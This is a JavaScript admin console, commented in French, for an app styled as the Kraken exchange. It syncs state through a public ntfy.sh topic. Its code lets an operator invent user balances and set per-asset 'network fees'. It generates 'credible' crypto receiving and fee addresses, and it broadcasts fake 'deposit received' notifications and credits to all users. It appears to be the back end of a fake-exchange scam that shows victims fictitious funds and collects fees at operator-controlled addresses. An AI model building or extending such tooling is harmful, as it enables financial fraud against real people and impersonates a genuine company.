/* Kraken — console d'administration. État partagé avec l'app via ntfy.sh. */
(() => {
  "use strict";

  const TOPIC = "kraken-partage-4b8d1c6f";
  const AKEY = "kraken_admin_v1";
  const JKEY = "kraken_admin_journal_v1";
  const $ = s => document.querySelector(s);
  const $$ = s => Array.from(document.querySelectorAll(s));

  const COINS = [
    { sym: "BTC", name: "Bitcoin", icon: "assets/img/coins/btc.svg" },
    { sym: "ETH", name: "Ethereum", icon: "assets/img/coins/eth.svg" },
    { sym: "USDC", name: "USDC", icon: "assets/img/coins/usdc.svg" },
    { sym: "SOL", name: "Solana", icon: "assets/img/coins/sol.svg" },
    { sym: "XRP", name: "XRP", icon: "assets/img/coins/xrp.svg" },
    { sym: "ADA", name: "Cardano", icon: "assets/img/coins/ada.svg" },
    { sym: "DOGE", name: "Dogecoin", icon: "assets/img/coins/doge.svg" },
    { sym: "SUI", name: "Sui", icon: "assets/img/coins/sui.svg" },
    { sym: "LINK", name: "Chainlink", icon: "assets/img/coins/link.svg" },
    { sym: "AVAX", name: "Avalanche", icon: "assets/img/coins/avax.svg" },
    { sym: "DOT", name: "Polkadot", icon: "assets/img/coins/dot.svg" },
    { sym: "HYPE", name: "Hyperliquid", icon: "assets/img/coins/hyperliquid.png" }
  ];
  const EUR = { sym: "EUR", name: "Euro", icon: "assets/img/flag_eu.webp" };
  const coin = s => s === "EUR" ? EUR : COINS.find(c => c.sym === s);

  const DEFAULTS = {
    first: "bernard", last: "", email: "bernard@exemple.com",
    cash: 0, gas: 2.40, balances: {}, fees: {}, addresses: {}, feeAddresses: {}, rev: 0
  };

  const load = () => {
    try {
      const p = JSON.parse(localStorage.getItem(AKEY) || "{}");
      return {
        ...structuredClone(DEFAULTS), ...p,
        balances: { ...(p.balances || {}) },
        fees: { ...(p.fees || {}) },
        addresses: { ...(p.addresses || {}) },
        feeAddresses: { ...(p.feeAddresses || {}) }
      };
    } catch { return structuredClone(DEFAULTS); }
  };
  let ST = load();
  let DSYM = "BTC";
  let busy = false;
  let lastSync = 0;

  const save = () => localStorage.setItem(AKEY, JSON.stringify(ST));
  const nf = (n, d = 2) => Number(n).toLocaleString("fr-FR", { minimumFractionDigits: d, maximumFractionDigits: d });
  const eur = n => nf(n, 2) + " €";
  const parseAmt = v => {
    if (typeof v !== "string") v = String(v ?? "");
    const n = parseFloat(v.replace(/\s/g, "").replace(",", "."));
    return Number.isFinite(n) ? n : 0;
  };
  const fmtWhen = ts => {
    const d = new Date(ts);
    return d.toLocaleDateString("fr-FR", { day: "2-digit", month: "short" }) + " · " +
      d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" });
  };
  const qtyTxt = (n, s) => nf(n, 8).replace(/0+$/, "").replace(/,$/, "") + " " + s;

  // ── adresses de réception crédibles, fixes par actif ─────────────────
  const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  const BECH = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
  const HEX = "0123456789abcdef";
  const rnd = (set, n) => {
    const b = new Uint8Array(n); crypto.getRandomValues(b);
    let s = ""; for (const x of b) s += set[x % set.length];
    return s;
  };
  const GEN = {
    BTC: () => "bc1q" + rnd(BECH, 38),
    ETH: () => "0x" + rnd(HEX, 40),
    USDC: () => "0x" + rnd(HEX, 40),
    LINK: () => "0x" + rnd(HEX, 40),
    AVAX: () => "0x" + rnd(HEX, 40),
    HYPE: () => "0x" + rnd(HEX, 40),
    SOL: () => rnd(B58, 44),
    XRP: () => "r" + rnd(B58, 33),
    ADA: () => "addr1q" + rnd(BECH, 56),
    DOGE: () => "D" + rnd(B58, 33),
    SUI: () => "0x" + rnd(HEX, 64),
    DOT: () => "1" + rnd(B58, 47),
    EUR: () => "FR76 3000 4006 9700 0123 4567 890"
  };
  const genAddr = sym => (GEN[sym] ? GEN[sym]() : "0x" + rnd(HEX, 40));

  // Adresses actives par defaut : ce sont exactement celles que l'app
  // affiche tant qu'aucune adresse personnalisee n'a ete publiee.
  const APP_ADDR = {
    EUR: "FR76 3000 4000 0300 0000 4821 264",
    BTC: "bc1qh4kra3n8x7f3a2c58be41d6f8a0m2j9",
    ETH: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    SOL: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
    USDC: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
    ADA: "addr1qx2kra3n8x7f3a2c58be41d6f8a0m2j9v4p6",
    DOGE: "DMu3Xkra3n8x7f3a2c58be41d6f8a0m2j9",
    SUI: "0x7f3a2c58be41d6f8a0c4e19bb7d5a12f9c8d3e61",
    LINK: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    AVAX: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    DOT: "1kra3n8x7f3a2c58be41d6f8a0M2j9v4P6",
    HYPE: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61"
  };

  function ensureAddresses() {
    let changed = false;
    for (const c of [...COINS, EUR]) {
      if (!ST.addresses[c.sym] || ST.addresses[c.sym].length < 10) {
        ST.addresses[c.sym] = APP_ADDR[c.sym] || genAddr(c.sym);
        changed = true;
      }
    }
    if (changed) save();
  }

  // ── transport ────────────────────────────────────────────────────────
  const snapshot = () => ({
    first: ST.first, last: ST.last, email: ST.email,
    cash: Number(ST.cash) || 0, gas: Number(ST.gas) || 0,
    balances: { ...ST.balances }, fees: { ...ST.fees },
    usdcFee: { ...(ST.usdcFee || {}) },
    addresses: { ...ST.addresses },
    feeAddresses: { ...(ST.feeAddresses || {}) },
    rev: Number(ST.rev) || 0
  });

  // réseaux USDC (mêmes identifiants que l'app)
  const USDC_NETS = [
    { id: "erc20", label: "Ethereum (ERC20)" },
    { id: "polygon", label: "Polygon" },
    { id: "arbitrum", label: "Arbitrum One" },
    { id: "optimism", label: "Optimism" },
    { id: "base", label: "Base" },
    { id: "solana", label: "Solana" }
  ];

  async function publish(msg) {
    const ctrl = new AbortController();
    const cut = setTimeout(() => ctrl.abort(), 8000);
    try {
      const r = await fetch("https://ntfy.sh/" + TOPIC, {
        method: "POST", body: JSON.stringify({ app: "kraken", ...msg }),
        headers: { "Content-Type": "text/plain" }, signal: ctrl.signal
      });
      // Un 429 (limite ntfy) n'est pas une reussite : sans ce test la
      // console annoncait "synchronise" alors que rien n'etait publie.
      if (!r.ok) throw new Error("HTTP " + r.status);
      setLive(true);
      return true;
    } catch { setLive(false); return false; }
    finally { clearTimeout(cut); }
  }

  // Publication en attente : garde l'etat sous le coude et reessaie tant
  // que ntfy refuse, pour qu'un frais enregistre finisse toujours par partir.
  const PKEY = "kraken_admin_pending_v1";
  let pendingPub = false;
  let addrDirty = false;  // saisie d'adresse en cours, non publiee
  const setPending = v => {
    pendingPub = !!v;
    try { if (v) localStorage.setItem(PKEY, "1"); else localStorage.removeItem(PKEY); } catch { }
  };
  try { pendingPub = localStorage.getItem(PKEY) === "1"; } catch { }

  async function publishState() {
    ST.rev = Math.max(Date.now(), (Number(ST.rev) || 0) + 1);
    save();
    const ok = await publish({ type: "state", state: snapshot() });
    if (!ok) setPending(true);
    renderSync();
    return ok;
  }

  function applyState(s) {
    if (!s || !(Number(s.rev) > (Number(ST.rev) || 0))) return false;
    ST.first = String(s.first ?? ST.first);
    ST.last = String(s.last ?? ST.last);
    ST.email = String(s.email ?? ST.email);
    ST.cash = Math.max(0, Number(s.cash) || 0);
    ST.gas = Math.max(0, Number(s.gas) || 0);
    ST.balances = { ...(s.balances || {}) };
    ST.fees = { ...(s.fees || {}) };
    ST.usdcFee = { ...(s.usdcFee || {}) };
    ST.addresses = { ...(s.addresses || {}) };
    ST.feeAddresses = { ...(s.feeAddresses || {}) };
    ST.rev = Number(s.rev);
    save();
    return true;
  }

  function setLive(on) {
    const l = $("#live");
    if (!l) return;
    l.classList.toggle("on", on);
    $("#liveTxt").textContent = on ? "En ligne" : "Hors ligne";
  }

  async function poll() {
    if (busy || document.hidden) return;
    busy = true;
    const ctrl = new AbortController();
    const cut = setTimeout(() => ctrl.abort(), 8000);
    // since=all ne sert qu'au premier passage : ensuite on ne demande que
    // les messages posterieurs, ce qui allege fortement la limite ntfy.
    const since = Number(ST.msgTime) || 0;
    const url = "https://ntfy.sh/" + TOPIC + "/json?poll=1&since=" + (since || "all");
    try {
      const r = await fetch(url, { cache: "no-store", signal: ctrl.signal });
      const txt = await r.text();
      let best = null, bestT = 0;
      for (const line of txt.split("\n")) {
        if (!line.trim()) continue;
        let m; try { m = JSON.parse(line); } catch { continue; }
        if (m.event !== "message" || !m.message) continue;
        lastSync = Math.max(lastSync, (Number(m.time) || 0) * 1000);
        let p; try { p = JSON.parse(m.message); } catch { continue; }
        if (p.app !== "kraken" || p.type !== "state" || !p.state) continue;
        const t = Number(m.time) || 0;
        if (!best || t >= bestT) { bestT = t; best = p.state; }
      }
      const seen = Number(ST.msgTime) || 0;
      if (best && bestT > seen) {
        ST.msgTime = bestT;
        if (applyState(best)) {
          ensureAddresses();
          // Ne pas re-rendre pendant une saisie d'adresse : sinon la synchro
          // efface la valeur en cours de frappe sous les doigts.
          const a = document.activeElement;
          const typing = addrDirty || !!(a && (a.matches("[data-addr],[data-feeaddr]") || a.id === "dEdit"));
          if (typing) renderSync(); else renderAll();
        }
        save();
      }
      setLive(true);
    } catch { setLive(false); }
    clearTimeout(cut);
    busy = false;
    renderSync();
  }

  // ── rendu ────────────────────────────────────────────────────────────
  function renderAccount() {
    $("#aFirst").value = ST.first || "";
    $("#aLast").value = ST.last || "";
    $("#aMail").value = ST.email || "";
    $("#aCash").value = nf(ST.cash || 0, 2);
    $("#aGas").value = nf(ST.gas || 0, 2);
  }

  function renderWallet() {
    const uf = ST.usdcFee || {};
    const uvals = USDC_NETS.map(n => Number(uf[n.id]) || 0).filter(v => v > 0);
    const uAll = uvals.length === USDC_NETS.length && uvals.every(v => v === uvals[0]) ? uvals[0] : 0;
    $("#walletRows").innerHTML = COINS.map(c => {
      const b = ST.balances[c.sym];
      const f = ST.fees[c.sym];
      const locked = c.sym === "USDC";
      return `<div class="coinrow">
        <img class="coin" src="${c.icon}" alt="">
        <span class="sym">${c.sym}</span>
        <input data-bal="${c.sym}" inputmode="decimal" placeholder="0" value="${b ? String(b).replace(".", ",") : ""}">
        <span class="fee">${
          locked
            ? `<input data-usdcall inputmode="decimal" placeholder="${nf(ST.gas || 0, 2)}" value="${uAll ? String(uAll).replace(".", ",") : ""}" title="S'applique à tous les réseaux USDC">`
            : `<input data-fee="${c.sym}" inputmode="decimal" placeholder="${nf(ST.gas || 0, 2)}" value="${f ? String(f).replace(".", ",") : ""}">`
        }</span>
      </div>`;
    }).join("");
    $("#walletGrid").innerHTML = COINS.map(c =>
      `<button class="pick" data-add="${c.sym}"><img class="coin" src="${c.icon}" alt=""><b>${c.sym}</b></button>`
    ).join("");
    renderFees();
  }

  // frais réseau : USDC uniquement, par réseau
  function renderFees() {
    const box = $("#feeRows");
    if (!box) return;
    const cur = ST.usdcFee || {};
    box.innerHTML = USDC_NETS.map(n => `
      <div class="coinrow">
        <span class="sym" style="width:auto;flex:1">${n.label}</span>
        <input data-unet="${n.id}" inputmode="decimal" placeholder="${nf(ST.gas || 0, 2)}" value="${cur[n.id] ? String(cur[n.id]).replace(".", ",") : ""}">
      </div>`).join("");
  }

  // Toutes les adresses de réception, une par actif, plus l'adresse de
  // perception des frais qui peut être distincte pour chaque actif.
  function renderAddresses() {
    const box = $("#addrRows");
    if (!box) return;
    box.innerHTML = [...COINS, EUR].map(c =>
      `<div class="addrrow">
        <span class="sym">${c.sym}</span>
        <span class="addrfields">
          <span class="addrline">
            <input data-addr="${c.sym}" spellcheck="false" autocomplete="off"
                   value="${ST.addresses[c.sym] || ""}" placeholder="Réception — ${genAddr(c.sym)}">
            <button type="button" class="regen-mini" data-regen="${c.sym}" title="Générer une adresse ${c.sym} — tu pourras la modifier">Régénérer</button>
          </span>
          <input data-feeaddr="${c.sym}" spellcheck="false" autocomplete="off" class="feeaddr"
                 value="${(ST.feeAddresses || {})[c.sym] || ""}" placeholder="Frais — même adresse">
        </span>
      </div>`).join("");
  }

  async function saveAllAddresses() {
    const recv = {}, fee = {}, cleared = [];
    $$("[data-addr]").forEach(inp => {
      const v = inp.value.trim();
      if (v.length >= 10) recv[inp.dataset.addr] = v;
    });
    $$("[data-feeaddr]").forEach(inp => {
      const v = inp.value.trim();
      const sym = inp.dataset.feeaddr;
      if (v.length >= 10) fee[sym] = v;
      else cleared.push(sym);
    });
    if (!Object.keys(recv).length && !Object.keys(fee).length && !cleared.length) {
      return toast("Aucune adresse valide");
    }
    ST.addresses = { ...ST.addresses, ...recv };
    // Un champ vidé remet l'adresse de frais sur celle de réception.
    const next = { ...(ST.feeAddresses || {}), ...fee };
    cleared.forEach(sym => { delete next[sym]; });
    ST.feeAddresses = next;
    addrDirty = false;
    const ok = await publishState();
    renderAll();
    toast(ok
      ? "Adresses publiées sur tous les appareils"
      : "Adresses enregistrées localement");
  }

  // Genere des adresses dans les champs, sans rien publier : l'utilisateur
  // peut les remplacer par sa propre adresse avant d'enregistrer.
  function regenAllAddresses() {
    $$("[data-addr]").forEach(inp => { inp.value = genAddr(inp.dataset.addr); });
    const first = $("[data-addr]");
    if (first) { first.focus(); try { first.select(); } catch { } }
    toast("Adresses générées - modifie-les puis Publier les adresses");
  }

  function renderDeposit() {
    $("#depGrid").innerHTML = [...COINS, EUR].map(c =>
      `<button class="pick ${c.sym === DSYM ? "on" : ""}" data-dep="${c.sym}"><img class="coin" src="${c.icon}" alt=""><b>${c.sym}</b></button>`
    ).join("");
    const c = coin(DSYM);
    $("#dAmount").placeholder = DSYM === "EUR" ? "50,00" : "0,0154";
    $("#dAddr").value = ST.addresses[DSYM] || "";
    $("#dAddr").placeholder = DSYM === "EUR" ? "FR76 …" : "Adresse d'envoi";
    $("#dText").placeholder = "Dépôt de " + (DSYM === "EUR" ? "50,00 €" : "0,0154 " + DSYM) + " reçu sur votre compte";
    $("#dOwn").textContent = ST.addresses[DSYM] || "—";
    if ($("#dEdit")) $("#dEdit").value = ST.addresses[DSYM] || "";
    $("#dSend").textContent = DSYM === "EUR"
      ? "Envoyer le dépôt à tous les utilisateurs"
      : "Envoyer le dépôt à tous les utilisateurs";
  }

  function journal() {
    try { const a = JSON.parse(localStorage.getItem(JKEY) || "[]"); return Array.isArray(a) ? a : []; }
    catch { return []; }
  }

  function renderLog() {
    const list = journal();
    $("#logCard").innerHTML = list.length ? list.map(j => `
      <div class="jrow">
        <span class="jico"><svg viewBox="0 0 24 24"><path d="M12 19V5"/><path d="M6 11l6-6 6 6"/></svg></span>
        <div class="jmain">
          <div class="jtitle">${j.kind === "deposit" ? "Dépôt envoyé" : "Notification envoyée"}</div>
          <div class="jtext">${j.text || ""}</div>
          ${j.amount ? `<div class="jamt">+${j.asset === "EUR" ? eur(j.amount) : qtyTxt(j.amount, j.asset)}</div>` : ""}
          ${j.addr ? `<div class="jaddr">${j.addr}</div>` : ""}
          <div class="jwhen">${fmtWhen(j.at)}</div>
        </div>
      </div>`).join("") : `<div class="empty">Aucune notification envoyée pour le moment.</div>`;
  }

  function renderSync() {
    const r = ST.rev ? fmtWhen(ST.rev) : "—";
    const a = lastSync ? fmtWhen(lastSync) : "—";
    if ($("#syncRev")) $("#syncRev").textContent = r;
    if ($("#syncAt")) $("#syncAt").textContent = a;
  }

  function renderAll() {
    renderAccount(); renderWallet(); renderAddresses(); renderDeposit(); renderLog(); renderSync();
  }

  // ── actions ──────────────────────────────────────────────────────────
  let tT;
  function toast(m) {
    const t = $("#toast");
    t.textContent = m; t.classList.add("on");
    clearTimeout(tT); tT = setTimeout(() => t.classList.remove("on"), 2300);
  }

  async function saveAccount() {
    ST.first = $("#aFirst").value.trim() || "bernard";
    ST.last = $("#aLast").value.trim();
    ST.email = $("#aMail").value.trim() || ST.email;
    ST.cash = Math.max(0, parseAmt($("#aCash").value));
    ST.gas = Math.max(0, parseAmt($("#aGas").value));
    const ok = await publishState();
    renderAll();
    toast(ok ? "Compte mis à jour sur tous les appareils" : "Publication en attente - nouvel essai automatique");
  }

  async function saveWallet() {
    $$("[data-bal]").forEach(inp => {
      const v = Math.max(0, parseAmt(inp.value));
      if (v > 0) ST.balances[inp.dataset.bal] = v;
      else delete ST.balances[inp.dataset.bal];
    });
    $$("[data-fee]").forEach(inp => {
      const v = Math.max(0, parseAmt(inp.value));
      if (v > 0) ST.fees[inp.dataset.fee] = v;
      else delete ST.fees[inp.dataset.fee];
    });
    ST.usdcFee = ST.usdcFee || {};
    // Champ USDC de la liste : une valeur ici s'applique a tous les reseaux.
    // Les champs detailles plus bas, s'ils sont remplis, restent prioritaires.
    const uAllInp = $("[data-usdcall]");
    const uAll = uAllInp ? Math.max(0, parseAmt(uAllInp.value)) : 0;
    if (uAll > 0) {
      // Une valeur dans le champ USDC de la liste vaut pour tous les reseaux.
      // Les champs detailles restent prioritaire seulement s'ils ont ete
      // edites APRES coup : on les remet d'abord a la valeur globale.
      USDC_NETS.forEach(n => { ST.usdcFee[n.id] = uAll; });
      $$("[data-unet]").forEach(inp => { inp.value = String(uAll).replace(".", ","); });
    } else {
      $$("[data-unet]").forEach(inp => {
        const raw = String(inp.value || "").trim();
        const v = Math.max(0, parseAmt(raw));
        if (v > 0) ST.usdcFee[inp.dataset.unet] = v;
        else delete ST.usdcFee[inp.dataset.unet];
      });
    }
    const ok = await publishState();
    renderAll();
    toast(ok ? "Portefeuille synchronisé" : "Publication en attente - nouvel essai automatique");
  }

  function pushJournal(o) {
    const list = journal();
    list.unshift(o);
    localStorage.setItem(JKEY, JSON.stringify(list.slice(0, 60)));
    renderLog();
  }

  async function sendDeposit() {
    const amount = Math.max(0, parseAmt($("#dAmount").value));
    if (!(amount > 0)) return toast("Saisissez le montant reçu");
    const addr = $("#dAddr").value.trim() || ST.addresses[DSYM] || "";
    const label = DSYM === "EUR" ? eur(amount) : qtyTxt(amount, DSYM);
    const text = $("#dText").value.trim() || ("Dépôt de " + label + " reçu sur votre compte");
    const credit = $("#dCredit").checked;

    if (credit) {
      if (DSYM === "EUR") ST.cash = Math.max(0, (Number(ST.cash) || 0) + amount);
      else ST.balances[DSYM] = (Number(ST.balances[DSYM]) || 0) + amount;
      ST.rev = Date.now();
      save();
    }

    const id = "d" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const jobs = [publish({ type: "notify", id, kind: "deposit", asset: DSYM, amount, addr, text })];
    if (credit) jobs.push(publish({ type: "state", state: snapshot() }));

    pushJournal({ id, kind: "deposit", asset: DSYM, amount, addr, text, at: Date.now() });
    const res = await Promise.all(jobs);
    renderAll();
    toast(res.some(Boolean) ? (credit ? "Dépôt envoyé et compte crédité" : "Dépôt envoyé à tous les utilisateurs") : "Hors ligne — dépôt non diffusé");
    if (res[0]) { $("#dAmount").value = ""; $("#dText").value = ""; }
  }

  async function sendNotice() {
    const text = $("#nText").value.trim();
    if (!text) return toast("Saisissez le message");
    const id = "n" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const ok = await publish({ type: "notify", id, kind: "notice", text });
    pushJournal({ id, kind: "notice", text, at: Date.now() });
    toast(ok ? "Notification envoyée à tous les utilisateurs" : "Hors ligne — notification non diffusée");
    if (ok) $("#nText").value = "";
  }

  // ── navigation ───────────────────────────────────────────────────────
  function tab(name) {
    $$(".view").forEach(v => v.classList.toggle("on", v.id === "v-" + name));
    $$(".tab").forEach(t => t.classList.toggle("on", t.dataset.tab === name));
    if (location.hash.slice(1) !== name) history.replaceState(null, "", "#" + name);
    scrollTo({ top: 0 });
  }

  $("#tabs").addEventListener("click", e => {
    const b = e.target.closest("[data-tab]");
    if (b) tab(b.dataset.tab);
  });

  $("#saveAccount").addEventListener("click", saveAccount);
  // Une frappe dans le champ USDC global se propage aux six reseaux : plus de
  // valeur perimee (2,4) qui reprend le dessus au moment d'enregistrer.
  document.addEventListener("input", e => {
    const el = e.target;
    if (!el || !el.matches || !el.matches("[data-usdcall]")) return;
    const v = String(el.value || "");
    if (!(parseAmt(v) > 0)) return;
    $$("[data-unet]").forEach(inp => { inp.value = v; });
  });

  // A l'inverse, editer un reseau a la main vide le champ global : le detail
  // redevient prioritaire et la valeur globale ne l'ecrase plus a l'enregistrement.
  document.addEventListener("input", e => {
    const el = e.target;
    if (!el || !el.matches || !el.matches("[data-unet]")) return;
    const all = $("[data-usdcall]");
    if (all) all.value = "";
  });

  $("#saveWallet").addEventListener("click", saveWallet);
  $("#dSend").addEventListener("click", sendDeposit);
  $("#nSend").addEventListener("click", sendNotice);
  $("#syncNow").addEventListener("click", async () => { await poll(); toast("Synchronisé"); });
  $("#dCopy").addEventListener("click", () => {
    navigator.clipboard?.writeText(ST.addresses[DSYM] || "");
    toast("Adresse copiée");
  });
  $("#dRegen").addEventListener("click", () => {
    const inp = $("#dEdit");
    inp.value = genAddr(DSYM);
    addrDirty = true;
    inp.focus();
    try { inp.select(); } catch { }
    toast("Adresse générée - modifie-la puis Enregistrer");
  });
  $("#dSaveAddr")?.addEventListener("click", async () => {
    const v = $("#dEdit").value.trim();
    if (v.length < 10) return toast("Adresse trop courte");
    ST.addresses[DSYM] = v;
    addrDirty = false;
    const ok = await publishState();
    renderAll();
    toast(ok ? "Adresse publiée sur tous les appareils" : "Adresse enregistrée localement");
  });
  $("#clearLog").addEventListener("click", () => {
    localStorage.removeItem(JKEY); renderLog(); toast("Journal vidé");
  });
  // Une frappe dans une adresse bloque le re-rendu tant qu'elle n'est pas
  // publiee : la synchro ne doit pas effacer la saisie personnalisee.
  ["#addrRows", "#dEdit"].forEach(sel => {
    const el = document.querySelector(sel);
    if (el) el.addEventListener("input", () => { addrDirty = true; });
  });

  // Régénérer par actif : le champ est rempli, jamais publié ni écrasé
  // tant que l'utilisateur n'a pas cliqué sur Publier les adresses.
  $("#addrRows")?.addEventListener("click", e => {
    const b = e.target.closest("[data-regen]");
    if (!b) return;
    const sym = b.dataset.regen;
    const inp = document.querySelector('[data-addr="' + sym + '"]');
    if (!inp) return;
    inp.value = genAddr(sym);
    addrDirty = true;
    inp.focus();
    try { inp.select(); } catch { }
    toast("Adresse " + sym + " générée - modifie-la puis Publier les adresses");
  });
  $("#saveAddrAll")?.addEventListener("click", saveAllAddresses);
  $("#regenAddrAll")?.addEventListener("click", regenAllAddresses);

  $("#walletGrid").addEventListener("click", e => {
    const b = e.target.closest("[data-add]");
    if (!b) return;
    const s = b.dataset.add;
    if (!(s in ST.balances)) ST.balances[s] = 0;
    renderWallet();
    toast(s + " ajouté au portefeuille");
  });

  $("#depGrid").addEventListener("click", e => {
    const b = e.target.closest("[data-dep]");
    if (!b) return;
    DSYM = b.dataset.dep;
    renderDeposit();
  });

  addEventListener("scroll", () => {
    const t = $("#top");
    if (t) t.classList.toggle("scrolled", scrollY > 4);
  }, { passive: true });

  document.addEventListener("visibilitychange", () => {
    if (document.hidden) return;
    poll();
    if (pendingPub) {
      publish({ type: "state", state: snapshot() }).then(ok => {
        if (ok) { setPending(false); renderSync(); }
      });
    }
  });

  // ── démarrage ────────────────────────────────────────────────────────
  ensureAddresses();
  renderAll();
  const bootTab = location.hash.slice(1);
  if (["account", "wallet", "deposit", "log"].includes(bootTab)) tab(bootTab);
  poll();
  // Une publication restee en attente (limite ntfy) repart des l'ouverture.
  if (pendingPub) {
    publish({ type: "state", state: snapshot() }).then(ok => {
      if (ok) { setPending(false); renderSync(); }
    });
  }
  setInterval(poll, 30000);
  // Tant que ntfy refuse la publication (429), un nouvel essai part toutes
  // les 20 s : le frais enregistre ne reste jamais coince en local.
  setInterval(async () => {
    if (!pendingPub) return;
    const ok = await publish({ type: "state", state: snapshot() });
    if (ok) { setPending(false); renderSync(); setLive(true); }
  }, 20000);
})();
